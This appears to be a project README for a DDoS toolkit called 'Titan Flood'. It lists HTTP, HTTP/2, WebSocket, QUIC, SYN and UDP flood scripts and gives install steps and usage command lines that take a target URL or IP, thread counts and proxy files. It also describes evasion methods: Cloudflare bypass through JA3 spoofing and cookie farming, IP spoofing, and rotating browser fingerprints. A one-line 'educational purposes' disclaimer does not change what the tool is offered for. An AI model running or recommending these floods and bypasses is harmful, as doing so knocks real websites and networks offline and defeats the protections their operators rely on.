# ⚡ Titan Flood - Layer 7 & Layer 4 DDoS Toolkit 2026

**Author:** [github.com/thesystemowner](https://github.com/thesystemowner)

Modern, optimized DDoS scripts with advanced bypass techniques for stress-testing and security research.

## 🚀 Features

### Layer 7 (Application Layer)
| Script | Type | Technique |
|--------|------|-----------|
| `titan-async.py` | HTTP/1.1 Async Flood | asyncio + aiohttp, 600+ req/s per core |
| `titan-http2.js` | HTTP/2 Flood | TLS 1.3 + proxy chaining, cluster mode |
| `titan-cf-bypass.js` | Cloudflare Bypass | JA3 spoofing + cookie farming + cloudscraper |
| `titan-browser.js` | Browser Emulation | Chrome 130-132 / Firefox 132-133 fingerprints |
| `titan-ws.js` | WebSocket Flood | Persistent WS connections with data injection |
| `titan-quic-flood.js` | QUIC/HTTP3 Flood | UDP QUIC Initial packets |

### Layer 4 (Network Layer)
| Script | Type | Est. Performance |
|--------|------|-----------------|
| `titan-syn-flood.c` | TCP SYN Flood | 300k+ pps per core |
| `rust-titan` | UDP Flood (Rust) | 400k+ pps per core, async Tokio |

## 📦 Installation

```bash
# Python scripts
pip install aiohttp

# Node.js scripts
npm install cloudscraper ws http2

# C SYN flood (Linux)
gcc L4/TCP/titan-syn-flood.c -pthread -o titan-syn

# Rust UDP flood
cd L4/rust-titan && cargo build --release
```

## 🎯 Usage

```bash
# L7 - Python async flood
python L7/titan-async.py <url> GET <time> [threads]

# L7 - Cloudflare bypass
node L7/titan-cf-bypass.js <url> <time> <rate> <threads> [proxyfile]

# L7 - HTTP/2 flood
node L7/titan-http2.js <url> <time> <rate> <threads> [proxyfile]

# L7 - WebSocket flood
node L7/titan-ws.js <ws://url> <time> <connections> [threads]

# L4 - SYN flood (Linux, root)
./titan-syn <ip> <port_start> <port_end> [threads]

# L4 - UDP flood (Rust)
cargo run --release -- -t <ip> -p <port> -P <pps> -d <duration>
```

## 🛡️ Techniques

- **TLS Fingerprint Spoofing** - JA3 emulation of Chrome/Firefox real fingerprints
- **HTTP/2 Settings Spoofing** - Match browser HPACK table, window size, frame size
- **Cookie Caching** - Farm cf_clearance cookies per proxy, reuse until expiry
- **Async I/O** - Non-blocking event loop, 10x more connections than threading
- **IP Spoofing** - Random source IP per packet (L4 raw sockets)
- **Multi-profile** - Browser detection evasion with rotating fingerprints

## ⚠️ Disclaimer

This toolkit is for **educational purposes and authorized security testing only**. Unauthorized use against targets you do not own or have explicit permission to test is illegal.

## 📞 Contact

**GitHub:** [github.com/thesystemowner](https://github.com/thesystemowner)
